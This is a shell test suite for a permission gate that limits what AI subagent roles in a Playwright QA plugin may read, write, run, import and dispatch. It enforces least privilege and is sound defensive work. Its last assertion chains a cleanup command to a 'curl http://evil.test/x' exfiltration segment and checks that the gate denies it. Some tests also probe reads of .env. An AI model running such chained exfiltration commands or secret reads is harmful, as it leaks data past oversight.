#!/bin/bash
# Tests for achilles-kernel-activation-gate.sh — the REGISTERED entry point
# to the kernel mandate kernel — together with the postinstall wiring that
# puts it there and the QA mandate it consults.
#
# Contract under test:
#   - postinstall registers the WRAPPER on PreToolUse:.*, not the raw
#     kernel; the kernel is copied beside the wrapper as
#     a companion (the wrapper execs it), replacing a stale copy.
#   - hooks/data/achilles-qa.kernel-mandate.json LOADS in the vendored
#     kernel with the intended boundaries (no role reads src/**
#     or .env; approvers have no shell; the main session is `orchestrator`;
#     the runner/resolution configs are the write-only scaffolder's, not
#     the orchestrator's; composers may import exactly the test framework).
#   - every dispatch shape the skills teach — `<role>-<slug>: …` with the
#     `<<kernel-mandate-role: ROLE#nonce>>` tag as the brief's first line —
#     is ALLOWED, the pre-kernel `composer-*` shape is DENIED, and the skill
#     files still carry those literals (drift pin).
#   - the wrapper is dormant without an achilles session marker and relays
#     the kernel's verdict with one; KERNEL_MANDATE=0 still bypasses; a
#     missing kernel script with a staged manifest is a deny.
#   - postinstall stages the manifest into <project>/.claude/ only when
#     none exists there, never overwrites, and writes nowhere else.

H="$HOOK_DIR/achilles-kernel-activation-gate.sh"
KERNEL="$HOOK_DIR/kernel-mandate-role-gate.sh"
REPO_ROOT="$(cd "$HOOK_DIR/.." && pwd)"
MANDATE="$HOOK_DIR/data/achilles-qa.kernel-mandate.json"

# ---------------------------------------------------------------------------
section "kernel wiring: postinstall registers the wrapper, not the raw kernel"
# ---------------------------------------------------------------------------
HOOK_MANIFEST="$HOOK_DIR/data/hook-manifest.json"
assert_eq "$("$JQ" '[.hooks[] | select(.file == "achilles-kernel-activation-gate.sh" and .event == "PreToolUse" and .matcher == ".*")] | length' "$HOOK_MANIFEST")" "1" \
  "wrapper registered once on PreToolUse with matcher .*"
assert_eq "$("$JQ" '[.hooks[] | select(.file == "kernel-mandate-role-gate.sh")] | length' "$HOOK_MANIFEST")" "0" \
  "raw kernel is NOT registered in the hook manifest"
assert_eq "$("$JQ" '[.companions[] | select(. == "kernel-mandate-role-gate.sh")] | length' "$HOOK_MANIFEST")" "1" \
  "raw kernel is copied as a companion (wrapper execs it)"

# ---------------------------------------------------------------------------
section "kernel wiring: the role ledger ships and is staged beside the mandate"
# ---------------------------------------------------------------------------
# A manifest is the machine's copy of the QA operating system; nobody
# reviews an OS by reading path globs. The ledger is the human copy — the
# twenty-three roles, what each is REFUSED, the handovers and the review loops —
# staged by postinstall beside the manifest it describes. Achilles does not
# vendor the `kernel-mandate doc` renderer, so the role inventory is
# hand-maintained and held to the manifest by lint-doc-drift's
# role-inventory check; these
# assertions are about the two properties that make it worth trusting: it
# ships, and it claims nothing the manifest does not.
LEDGER="$HOOK_DIR/data/achilles-qa.kernel-mandate.md"
assert_eq "$([ -f "$LEDGER" ] && echo present || echo missing)" "present" "hooks/data/achilles-qa.kernel-mandate.md ships"
for ROLE in orchestrator scaffolder test-composer workflow-reviewer \
            phase-validator process-validator perf-reviewer \
            probe reviewer phase1 phase2 phase4 stage2 cleanup companion fd contribution-handover \
            implementer task-reviewer verifier live-inspector doc-author; do
  assert_eq "$(grep -c "^### \`$ROLE\`" "$LEDGER")" "1" "ledger documents the $ROLE role exactly once"
done
assert_eq "$(grep -c '^\*\*May not\*\*' "$LEDGER")" "23" "every role carries a refusal list — the half a manifest states only by omission"
assert_eq "$(grep -c 'Snapshot of the upstream render' "$LEDGER")" "0" "the ledger carries no unregenerated snapshot sections"
assert_eq "$("$JQ" -r '.roles | keys | map(select(. == "batch-reviewer" or . == "in-flight-composer" or . == "selector-diff-validator")) | length' "$MANDATE")" "0" "orphan roles with no dispatch site are gone"
# The approver roles hold no shell. The ledger must SAY so, in the section
# for one of them — a ledger that quietly widens a role is worse than none.
APPROVER_SECTION=$(awk '/^### `workflow-reviewer`/{p=1} p{print} p&&/^### `[a-z-]+`$/&&!/workflow-reviewer/{exit}' "$LEDGER")
assert_eq "$(printf '%s' "$APPROVER_SECTION" | grep -c 'run any shell command')" "1" "the ledger states that an approver role runs nothing"
assert_eq "$(printf '%s' "$APPROVER_SECTION" | grep -c '^- \*\*Runs\*\*')" "0" "and grants it no commands"
# Staged by postinstall on the same never-overwrite terms as the manifest.
tmp_into STAGE_PROJ
stage_mandate() { CIVITAS_SKIP_HOOK_INSTALL= node -e "require('$REPO_ROOT/scripts/install/mandate.js').stageProjectMandate('$STAGE_PROJ')" >/dev/null; }
stage_mandate
assert_eq "$(cmp -s "$STAGE_PROJ/.claude/kernel-mandate.json" "$MANDATE" && echo same)" "same" "stageProjectMandate stages the manifest"
assert_eq "$(cmp -s "$STAGE_PROJ/.claude/kernel-mandate.md" "$LEDGER" && echo same)" "same" \
  "stageProjectMandate stages the ledger beside the manifest"
printf '{"custom":true}\n' > "$STAGE_PROJ/.claude/kernel-mandate.json"
stage_mandate
assert_eq "$(cat "$STAGE_PROJ/.claude/kernel-mandate.json")" '{"custom":true}' "a second staging leaves an existing manifest unchanged"

# ---------------------------------------------------------------------------
section "kernel wiring: the shipped QA mandate's hard boundaries"
# ---------------------------------------------------------------------------
assert_eq "$([ -f "$MANDATE" ] && echo present || echo missing)" "present" "hooks/data/achilles-qa.kernel-mandate.json ships"

# The boundaries the design states: each role binds its own agentType, the
# main session is the orchestrator, no role's read scope names application
# source, and only the scaffolder names the environment file.
BOUNDARIES=$("$JQ" -rn --slurpfile m "$MANDATE" '
  ($m[0]) as $k |
  [
    (if $k.settings.mainSessionRole == "orchestrator" then "main=orchestrator" else "main=\($k.settings.mainSessionRole)" end),
    (if ([$k.roles | to_entries[] | select(.value.agentTypes != [.key])] | length) == 0 then "agentTypes=self" else "agentTypes-drift" end),
    (if ([$k.roles[] | (.read.allow // [])[] | select(. == "src/**" or startswith("src/"))] | length) == 0 and ([$k.roles | to_entries[] | select(.key != "scaffolder") | .value.read.allow // [] | .[] | select(startswith(".env"))] | length) == 0 then "no-src-env-only-scaffolder" else "reads-src-or-env" end)
  ] | join(" ")')
assert_eq "$BOUNDARIES" "main=orchestrator agentTypes=self no-src-env-only-scaffolder" \
  "main session is orchestrator, agentTypes bind by name, nothing reads src/**, only the scaffolder reads .env"

# ---------------------------------------------------------------------------
section "kernel wiring: the QA mandate loads in the vendored kernel"
# ---------------------------------------------------------------------------
with_tmp_project_into KW_TMP tests/e2e/docs src; KP="$KW_TMP/proj"
stage_qa_mandate "$KP"

# Main session (no agent_id) binds as orchestrator.
assert_deny "$KERNEL" "$(payload tool_name=Read file_path="$KP/src/app.ts" cwd="$KP")" \
  "orchestrator Read src/app.ts → DENY" "outside the role's read scope"
assert_deny "$KERNEL" "$(payload tool_name=Read file_path="$KP/.env" cwd="$KP")" \
  "orchestrator Read .env → DENY" "outside the role's read scope"
assert_allow "$KERNEL" "$(payload tool_name=Read file_path="$KP/package.json" cwd="$KP")" \
  "orchestrator Read package.json → ALLOW"
assert_allow "$KERNEL" "$(payload tool_name=Write file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}' cwd="$KP")" \
  "orchestrator Write the ledger → ALLOW (SoD lives in the ledger write gate)"
assert_allow "$KERNEL" "$(payload tool_name=Write file_path="$KP/.gitignore" content='.achilles/' cwd="$KP")" \
  "orchestrator Write .gitignore → ALLOW"
assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright test --list' cwd="$KP")" \
  "orchestrator Bash npx playwright test --list → ALLOW"
assert_allow "$KERNEL" "$(payload tool_name=Bash command="git commit -m 'chore: scaffold e2e suite'" cwd="$KP")" \
  "orchestrator Bash git commit → ALLOW"
assert_deny "$KERNEL" "$(payload tool_name=Bash command='npm install left-pad' cwd="$KP")" \
  "orchestrator Bash npm install → DENY" "may not run this command"
assert_allow "$KERNEL" "$(payload tool_name=Skill skill=onboarding cwd="$KP")" \
  "orchestrator Skill onboarding → ALLOW"
assert_allow "$KERNEL" "$(payload tool_name=Agent description='workflow-reviewer-phase1: review phase 1' prompt='<<kernel-mandate-role: workflow-reviewer>>
Verify the ledger.' cwd="$KP")" \
  "orchestrator dispatches a tagged workflow-reviewer → ALLOW"

# Subagents bind by the host's agent_type. The kernel caches a binding per
# agent_id, so each role gets its own id — sharing one would re-use the
# first role for every later probe.
sub() { payload "$@" cwd="$KP" | "$JQ" -c '. + {agent_id: ("sub-" + .agent_type)}'; }
assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=workflow-reviewer command='ls')" \
  "workflow-reviewer Bash → DENY (approvers have no shell)" "may not use the 'Bash' tool"
for APPROVER in phase-validator process-validator perf-reviewer; do
  assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=$APPROVER command='ls')" "$APPROVER Bash → DENY (approvers have no shell)" "may not use the 'Bash' tool"
done
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=workflow-reviewer file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
  "workflow-reviewer Write the ledger → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=workflow-reviewer file_path="$KP/tests/e2e/login.spec.ts" content='x')" \
  "workflow-reviewer Write a spec → DENY" "outside the role's write scope"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=perf-reviewer file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
  "perf-reviewer Write the e2e ledger → DENY" "outside the role's write scope"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/login.spec.ts" content='import { test } from "./fixtures/auth"; test("x", async () => {});')" \
  "test-composer Write a spec (relative import) → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Read agent_type=test-composer file_path="$KP/src/app.ts")" \
  "test-composer Read src/app.ts → DENY" "outside the role's read scope"
assert_deny "$KERNEL" "$(sub tool_name=Skill agent_type=test-composer skill=frontend-design)" \
  "test-composer invoking a non-granted skill → DENY" "may not invoke the skill"

# ---------------------------------------------------------------------------
section "kernel wiring: runner config is the scaffolder's; imports are the composers'"
# ---------------------------------------------------------------------------
# The orchestrator both authors files and runs the runner, so the kernel's
# config screen refuses it the files a runner loads by convention. The
# table moves playwright.config.ts / package.json (and the Phase 1-2
# scaffold) to a write-only `scaffolder` — no shell, no dispatch — and the
# orchestrator's description names it, so the deny says where to go.
CFG_DENY=$(printf '%s' "$(payload tool_name=Write file_path="$KP/playwright.config.ts" content='export default {}' cwd="$KP")" | KERNEL_MANDATE_MANIFEST="$KERNEL_MANDATE_MANIFEST" KERNEL_MANDATE_STATE_DIR="$KERNEL_MANDATE_STATE_DIR" bash "$KERNEL" 2>/dev/null | "$JQ" -r '.hookSpecificOutput.permissionDecisionReason // ""')
assert_eq "$(printf '%s' "$CFG_DENY" | grep -c "may not write 'playwright.config.ts'")" "1" \
  "orchestrator Write playwright.config.ts → DENY (outside its write scope)"
assert_eq "$(printf '%s' "$CFG_DENY" | grep -c 'scaffolder')" "1" \
  "…and the reason names the scaffolder role as the author of that file"
assert_deny "$KERNEL" "$(payload tool_name=Write file_path="$KP/package.json" content='{}' cwd="$KP")" \
  "orchestrator Write package.json → DENY" "outside the role's write scope"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/playwright.config.ts" content='import { defineConfig } from "@playwright/test"; export default defineConfig({ reporter: [["html"], ["@civitas-cerebrum/achilles/reporter"]] });')" \
  "scaffolder (by agent_type) Write playwright.config.ts → ALLOW"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/package.json" content='{"scripts":{"test:repair":"achilles-self-repair"}}')" \
  "scaffolder Write package.json → ALLOW"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/tests/e2e/fixtures/auth.ts" content='import { test as base } from "@playwright/test"; export const test = base;')" \
  "scaffolder Write tests/e2e/fixtures/auth.ts importing the framework → ALLOW (authoring half runs nothing)"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/tests/e2e/page-repository.json" content='{}')" \
  "scaffolder Write tests/e2e/page-repository.json → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=scaffolder command='npx playwright test --list')" \
  "scaffolder Bash npx playwright test --list → DENY (never runs what it authored)" "may not use the 'Bash' tool"
assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=scaffolder command='ls')" \
  "scaffolder Bash ls → DENY (no shell at all)" "may not use the 'Bash' tool"
assert_deny "$KERNEL" "$(sub tool_name=Agent agent_type=scaffolder description='test-composer-j-x: compose' prompt='<<kernel-mandate-role: test-composer#ab12cd>>')" \
  "scaffolder Agent → DENY (no dispatch)" "may not use the 'Agent' tool"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/tests/e2e/login.spec.ts" content='x')" \
  "scaffolder Write a spec → DENY (scaffold only)" "outside the role's write scope"

# The composers author code AND run it, so their imports are screened
# against write.codeImports — declared in the table as exactly the two
# packages a spec legitimately imports (test-composer SKILL.md,
# element-interactions SKILL.md).
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/x.spec.ts" content='import { test } from "@playwright/test";')" \
  "test-composer Write a spec importing @playwright/test → ALLOW"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/x.spec.ts" content='import { test } from "@playwright/test"; import { ElementInteractions } from "@civitas-cerebrum/element-interactions";')" \
  "test-composer Write a spec importing @civitas-cerebrum/element-interactions → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/x.spec.ts" content='import fs from "fs"')" \
  "test-composer Write a spec importing fs → DENY" "filesystem access"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/env.spec.ts" content='import "dotenv/config"; import { test } from "@playwright/test";')" \
  "test-composer importing dotenv/config → DENY on every platform (BSD sed included)" ""
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/glob.spec.ts" content='const g = require("glob");')" \
  "test-composer requiring glob → DENY on every platform" ""
IMPORTS_CHECK=$("$JQ" -rn --slurpfile m "$MANDATE" '
  ($m[0].roles) as $r |
  [
    (if ($r["test-composer"].write.codeImports == ["@civitas-cerebrum/element-interactions","@playwright/test"]) then "composer-imports" else "composer-imports-drift" end),
    (if ($r.scaffolder.tools.allow | index("Bash") == null and index("Agent") == null) then "scaffolder-no-bash-no-agent" else "scaffolder-has-shell-or-dispatch" end),
    (if ($r.orchestrator.write.allow | index("playwright.config.ts") == null and index("package.json") == null) then "orchestrator-no-config" else "orchestrator-writes-config" end),
    (if ($r.orchestrator.dispatch | index("scaffolder") != null) then "orchestrator-dispatches-scaffolder" else "no-scaffolder-dispatch" end)
  ] | join(" ")')
assert_eq "$IMPORTS_CHECK" "composer-imports scaffolder-no-bash-no-agent orchestrator-no-config orchestrator-dispatches-scaffolder" \
  "manifest: test-composer declares exactly the framework imports, scaffolder has no shell/dispatch, orchestrator writes no config and dispatches the scaffolder"

# ---------------------------------------------------------------------------
section "kernel wiring: dispatch grammar — every shape the skills teach binds, the old one is refused"
# ---------------------------------------------------------------------------
# disp <description> <tag line> [subagent_type] → an Agent payload from the
# orchestrator whose prompt opens with the tag, as the brief templates do.
disp() {
  payload tool_name=Agent description="$1" prompt="$2
Read the ledger at tests/e2e/docs/onboarding-status.json and verify the deliverables on disk." cwd="$KP" \
    | "$JQ" -c --arg t "${3:-}" 'if $t != "" then .tool_input.subagent_type = $t else . end'
}
# The scaffolder shapes are read out of the onboarding skill's own fenced
# templates (`description:` / `prompt:` lines), with <nonce> filled in —
# so the test dispatches exactly what the skill teaches.
ONB="$REPO_ROOT/skills/onboarding/SKILL.md"
tmpl_desc() { grep -m1 -E "^description:[[:space:]]+$1" "$ONB" | sed -E 's/^description:[[:space:]]+//'; }
tmpl_tag()  { grep -m1 -E "^prompt:[[:space:]]+<<kernel-mandate-role: $1#<nonce>>>" "$ONB" | sed -E 's/^prompt:[[:space:]]+//' | sed "s/<nonce>/$2/"; }
P1_DESC=$(tmpl_desc 'scaffolder-phase1:'); P1_TAG=$(tmpl_tag scaffolder k9x2a1)
P2_DESC=$(tmpl_desc 'scaffolder-phase2:'); P2_TAG=$(tmpl_tag scaffolder k9x2a2)
assert_eq "$([ -n "$P1_DESC" ] && [ -n "$P1_TAG" ] && [ -n "$P2_DESC" ] && [ -n "$P2_TAG" ] && echo found || echo missing)" "found" \
  "onboarding SKILL.md carries the scaffolder-phase1 / scaffolder-phase2 dispatch templates (description + tagged prompt)"
assert_allow "$KERNEL" "$(disp "$P1_DESC" "$P1_TAG" scaffolder)" \
  "onboarding Phase 1 template (from the skill text): orchestrator dispatches scaffolder-phase1 → ALLOW"
assert_allow "$KERNEL" "$(disp "$P2_DESC" "$P2_TAG" scaffolder)" \
  "onboarding Phase 2 template (from the skill text): orchestrator dispatches scaffolder-phase2 → ALLOW"
# Literal copies of the other skills' dispatch shapes (the skill each
# mirrors is named; the literals are pinned to the skill files below).
assert_allow "$KERNEL" "$(disp 'test-composer-j-login-flow: compose the login-flow journey' '<<kernel-mandate-role: test-composer#m3n4p5>>' test-composer)" \
  "test-composer SKILL.md / onboarding Phase 3: test-composer-j-<slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'test-composer-sj-checkout-1: cycle 1' '<<kernel-mandate-role: test-composer#m3n4p6>>' test-composer)" \
  "coverage-expansion: test-composer-sj-<slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'secrets-sweep-phase7: extract literals to .env' '<<kernel-mandate-role: secrets-sweep#m3n4p7>>' secrets-sweep)" \
  "onboarding Phase 7 / secrets-sweep: secrets-sweep-phase7 + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'scaffolder-phase7: wire .env' '<<kernel-mandate-role: scaffolder#m3n4p8>>' scaffolder)" \
  "onboarding Phase 7 / env wiring: scaffolder-phase7 + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'workflow-reviewer-phase3: review Phase 3' '<<kernel-mandate-role: workflow-reviewer#q7r8s9>>' workflow-reviewer)" \
  "workflow-reviewer SKILL.md / onboarding: workflow-reviewer-phase<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'workflow-reviewer-pass2: review Pass 2' '<<kernel-mandate-role: workflow-reviewer#q7r8t0>>' workflow-reviewer)" \
  "coverage-expansion: workflow-reviewer-pass<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'workflow-reviewer-cycle1: review cycle 1' '<<kernel-mandate-role: workflow-reviewer#q7r8t1>>' workflow-reviewer)" \
  "journey-mapping: workflow-reviewer-cycle<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase-validator-4: greenlight Phase 4' '<<kernel-mandate-role: phase-validator#z7a8b9>>' phase-validator)" \
  "phase-validator-<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'perf-reviewer-phase1: review perf Phase 1' '<<kernel-mandate-role: perf-reviewer#t1u2v3>>' perf-reviewer)" \
  "perf-onboarding: perf-reviewer-phase<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'perf-reviewer-pass-load: review the load pass' '<<kernel-mandate-role: perf-reviewer#t1u2v4>>' perf-reviewer)" \
  "perf-onboarding: perf-reviewer-pass-<kind> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'process-validator-stage-a-wave: validate the planned wave' '<<kernel-mandate-role: process-validator#w4x5y6>>' process-validator)" \
  "process-validator-workflow.md: process-validator-<scope> + tag → ALLOW"
# A tag without subagent_type still binds (the type is optional; when
# present it must agree).
assert_allow "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-mandate-role: test-composer#m3n4p8>>')" \
  "tagged dispatch without subagent_type → ALLOW"
# Refused shapes — each deny names the fix.
assert_deny "$KERNEL" "$(disp 'composer-j-login-flow: compose the login-flow journey' '<<kernel-mandate-role: test-composer#m3n4p9>>' test-composer)" \
  "pre-kernel composer-j-<slug>: shape → DENY (names no manifest role)" "names no manifest role"
assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' 'Compose the journey.' test-composer)" \
  "test-composer-j-<slug>: without the binding tag → DENY" "missing the binding tag"
assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-mandate-role: test-composer#n0n1n2>>' workflow-reviewer)" \
  "description names test-composer, subagent_type is workflow-reviewer → DENY" "subagent_type"
# A near-miss tag (nonce under 4 chars) and a tag for another role both
# leave the TARGET untagged, which is the check the kernel reports first.
assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-mandate-role: test-composer#ab>>' test-composer)" \
  "nonce shorter than 4 chars → DENY (near-miss tag binds nothing)" "missing the binding tag"
assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-mandate-role: workflow-reviewer#n0n1n3>>' test-composer)" \
  "tag names a different role than the description → DENY" "missing the binding tag"

# ---------------------------------------------------------------------------
section "kernel wiring: the in-pipeline worker roles the protocol dispatches"
# ---------------------------------------------------------------------------
# These shapes are documented in coverage-expansion SKILL.md §"Role
# prefixes", references/app-wide-scan.md, journey-mapping's phases.md and
# onboarding SKILL.md; an unresolved one blocks the run at the Agent call.
# The role set is DERIVED from the two harness prefix regexes (pinned
# below), not from a hand-kept list.
assert_allow "$KERNEL" "$(disp 'probe-j-login: adversarial probe, pass 4' '<<kernel-mandate-role: probe#p1q2r3>>' probe)" \
  "coverage-expansion pass 4-5 / bug-discovery: probe-j-<slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'probe-app-wide: pass 4 — establish pattern catalogue' '<<kernel-mandate-role: probe#p1q2r4>>' probe)" \
  "app-wide-scan.md: probe-app-wide + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'reviewer-j-login: stage B review' '<<kernel-mandate-role: reviewer#r1s2t3>>' reviewer)" \
  "coverage-expansion Stage B: reviewer-j-<slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'reviewer-batch-pass-2: cycle-1 batch review' '<<kernel-mandate-role: reviewer#r1s2t4>>' reviewer)" \
  "coverage-expansion batch mode: reviewer-batch-pass-<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase4-prioritise-author: author the journey map' '<<kernel-mandate-role: phase4#f1g2h3>>' phase4)" \
  "journey-mapping: phase4-prioritise-author + tag → ALLOW (sole author of the map sentinel)"
assert_allow "$KERNEL" "$(disp 'phase4-cycle-1: discovery cycle' '<<kernel-mandate-role: phase4#f1g2h4>>' phase4)" \
  "journey-mapping: phase4-cycle-<N> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase4-cycle-1-section-checkout: section discovery' '<<kernel-mandate-role: phase4#f1g2h5>>' phase4)" \
  "journey-mapping: phase4-cycle-<N>-section-<id> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase1-root: crawl the root subtree' '<<kernel-mandate-role: phase1#a1b2c3>>' phase1)" \
  "journey-mapping Phase 1: phase1-<entry> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase1-test-infra: post-crawl infrastructure probe' '<<kernel-mandate-role: phase1#a1b2c4>>' phase1)" \
  "journey-mapping Phase 1: phase1-test-infra + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'phase2-admin: identify the admin flows' '<<kernel-mandate-role: phase2#a1b2c5>>' phase2)" \
  "journey-mapping Phase 2: phase2-<scope> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'stage2-auth-cap: inspect the login elements' '<<kernel-mandate-role: stage2#s1t2u3>>' stage2)" \
  "stages-protocol.md Stage 2: stage2-<scenario> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'cleanup-dedup: drop redundant specs' '<<kernel-mandate-role: cleanup#c1d2e4>>' cleanup)" \
  "coverage-expansion cleanup pass: cleanup-<scope> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'companion-reset-flow: verify the task' '<<kernel-mandate-role: companion#c1d2e5>>' companion)" \
  "companion-mode: companion-<task-slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'fd-login-timeout: diagnose the failure' '<<kernel-mandate-role: fd#d1e2f3>>' fd)" \
  "failure-diagnosis: fd-<test-slug> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'fd-ci-849201: diagnose the CI failure' '<<kernel-mandate-role: fd#d1e2f4>>' fd)" \
  "failure-diagnosis: fd-ci-<run-id> + tag → ALLOW"
assert_allow "$KERNEL" "$(disp 'contribution-handover-pr82: fill the handover' '<<kernel-mandate-role: contribution-handover#h1i2j3>>' contribution-handover)" \
  "contributing-to-achilles-protocol: contribution-handover-<slug> + tag → ALLOW"

# Grouped dispatch is role-first (`test-composer-group-<id>: …`, bound in
# case 85). The legacy leading `[group]` / `[P3-batch]` markers name no
# role to the kernel, which resolves it from the first characters.
assert_deny "$KERNEL" "$(disp '[group] test-composer-j-a,test-composer-j-b: compose the group' '<<kernel-mandate-role: test-composer#g1h2i3>>' test-composer)" \
  "[group] marker leads the description → DENY (kernel resolves the role from position zero)" "names no manifest role"
assert_deny "$KERNEL" "$(disp '[P3-batch] test-composer-j-a,test-composer-j-b: compose the batch' '<<kernel-mandate-role: test-composer#g1h2i4>>' test-composer)" \
  "[P3-batch] marker leads the description → DENY (same resolver rule)" "names no manifest role"

# ---------------------------------------------------------------------------
section "kernel wiring: drift pin — every harness prefix resolves to a manifest role"
# ---------------------------------------------------------------------------
# Checking only that a retired spelling left the skills would not catch a
# live dispatch prefix resolving to nothing, so this pins the forward
# direction. The harness states its dispatch grammar twice — as
# playwright-cli session slugs and as Agent-description prefixes — and
# both statements must land on a role the manifest actually declares.
DISPATCH_SH="$HOOK_DIR/lib/dispatch-prefix.sh"
# Pull the alternation out of each regex literal. Trailing `-` (the
# description form carries it, the slug form does not) is normalised off.
extract_alts() { # <file> <var-name>
  grep -m1 "^$2='" "$1" \
    | grep -oE '\([^)]*\)' | head -1 | tr -d '()' | tr '|' '\n' | sed -e 's/-$//' -e '/^$/d'
}
SLUG_ALTS=$(extract_alts "$DISPATCH_SH" DISPATCH_SLUG_PREFIX_RE)
DISP_ALTS=$(extract_alts "$DISPATCH_SH" ACHILLES_DISPATCH_PREFIX_RE)
# A pin that extracts nothing passes trivially, so assert it extracted
# something first — a regex rename must break this loudly, not quietly.
assert_eq "$([ "$(printf '%s\n' "$SLUG_ALTS" | wc -l)" -ge 8 ] && echo enough || echo "too-few:$SLUG_ALTS")" "enough" \
  "DISPATCH_SLUG_PREFIX_RE still parses into its prefix alternation"
assert_eq "$([ "$(printf '%s\n' "$DISP_ALTS" | wc -l)" -ge 8 ] && echo enough || echo "too-few:$DISP_ALTS")" "enough" \
  "ACHILLES_DISPATCH_PREFIX_RE still parses into its prefix alternation"
# The kernel's own resolution rule: a description `<prefix>-<slug>:`
# binds role R when R == prefix or the prefix starts with `R-` (longest
# role name wins, so `phase4` covers `phase4-cycle-1:`).
MANIFEST_ROLE_NAMES=$("$JQ" -r '.roles | keys[]' "$MANDATE")
prefix_resolves() { # <prefix>
  local p="$1" r
  while IFS= read -r r; do
    [ -n "$r" ] || continue
    [ "$p" = "$r" ] && return 0
    case "$p" in "$r"-*) return 0 ;; esac
  done <<< "$MANIFEST_ROLE_NAMES"
  return 1
}
UNRESOLVED=""
while IFS= read -r PFX; do
  [ -n "$PFX" ] || continue
  prefix_resolves "$PFX" || UNRESOLVED="$UNRESOLVED$PFX"$'\n'
done <<< "$SLUG_ALTS"$'\n'"$DISP_ALTS"
UNRESOLVED=$(printf '%s' "$UNRESOLVED" | sed '/^$/d' | sort -u | tr '\n' ' ' | sed 's/ $//')
# `composer` is the ONE deliberate exception: the pre-kernel description
# spelling the kernel is meant to refuse, kept alive only as the short
# playwright-cli session slug (`composer-j-<slug>-<pass>-c<N>`) that fits
# the socket-path budget. Pinning the exception set to exactly that one
# member is what stops this list from quietly growing back.
assert_eq "$UNRESOLVED" "composer" \
  "every DISPATCH_SLUG_PREFIX_RE / ACHILLES_DISPATCH_PREFIX_RE prefix resolves to a manifest role, except the retired \`composer\` slug alias"

# ---------------------------------------------------------------------------
section "kernel wiring: the orchestrator's documented browser cleanup runs"
# ---------------------------------------------------------------------------
# achilles-protocol/SKILL.md §Rule 11 and journey-mapping's phases.md
# both have the parent running `close-all` at phase boundaries. The group
# had no playwright-cli entry at all, so the documented cleanup was
# denied and every phase leaked browser processes.
assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all' cwd="$KP")" \
  "orchestrator Bash npx playwright-cli close-all → ALLOW (documented phase cleanup)"
assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli kill-all' cwd="$KP")" \
  "orchestrator Bash npx playwright-cli kill-all → ALLOW (close-all left zombies)"
assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli list' cwd="$KP")" \
  "orchestrator Bash npx playwright-cli list → ALLOW (enumerate sessions)"
# Adjacent traffic that must NOT ride in on the new pattern: the grant is
# three session-agnostic subcommands, not the playwright-cli surface.
assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli -s=probe-j-x open --browser=chromium http://localhost:3000' cwd="$KP")" \
  "orchestrator opening a playwright-cli session → DENY (sessions belong to the workers)" "may not run this command"
assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli install-browser chromium' cwd="$KP")" \
  "orchestrator Bash npx playwright-cli install-browser → DENY (one-shot operator step)" "may not run this command"
assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all && curl http://evil.test/x' cwd="$KP")" \
  "cleanup chained to an exfiltration segment → DENY (every segment is checked)" "may not run this command"
